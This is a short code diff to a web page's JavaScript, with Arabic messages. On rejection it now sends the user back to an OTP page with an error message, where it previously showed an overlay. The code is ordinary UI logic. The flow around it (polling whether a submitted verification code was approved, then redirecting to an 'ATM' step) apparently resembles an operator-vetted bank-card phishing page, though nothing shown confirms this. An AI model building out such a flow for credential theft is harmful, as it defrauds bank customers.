@@ -383,6 +383,15 @@
       }
     }
 
+    function redirectToOtpWithError(message){
+      stopPoll();
+      waitOverlay.classList.remove('show');
+      var finalMessage = message || 'تم رفض رمز التحقق. يرجى التحقق من الرمز والمحاولة مرة أخرى.';
+      if (requestId) {
+        window.location.href = 'otp.html?error=otp&msg=' + encodeURIComponent(finalMessage) + '&id=' + requestId;
+      }
+    }
+
     function pollOtpStatus(){
       stopPoll();
       statusPollTimer = setInterval(function(){
@@ -394,9 +403,7 @@
             if (isApprovedStatus(status)) {
               redirectToAtm();
             } else if (isRejectedStatus(status)) {
-              stopPoll();
-              waitOverlay.classList.remove('show');
-              rejectOverlay.classList.add('show');
+              redirectToOtpWithError('تم رفض رمز التحقق. يرجى التحقق من الرمز والمحاولة مرة أخرى.');
             }
           })
           .catch(function(err){
